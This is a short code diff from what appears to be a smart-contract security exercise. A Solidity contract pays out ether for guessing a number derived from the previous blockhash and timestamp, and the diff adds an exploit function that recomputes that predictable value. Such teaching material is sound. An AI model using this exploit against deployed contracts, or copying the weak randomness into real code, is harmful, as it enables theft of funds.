@@ -15,7 +15,7 @@ contract GuessNewNumber {
         uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
 
         if (n == answer) {
-            (bool ok,) = msg.sender.call{value: 2 ether}("");
+            (bool ok, ) = msg.sender.call{value: 2 ether}("");
             require(ok, "Fail to send to msg.sender");
             pass = true;
         }
@@ -28,6 +28,8 @@ contract ExploitContract {
     uint8 public answer;
 
     function Exploit() public returns (uint8) {
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+
         return answer;
     }
 }
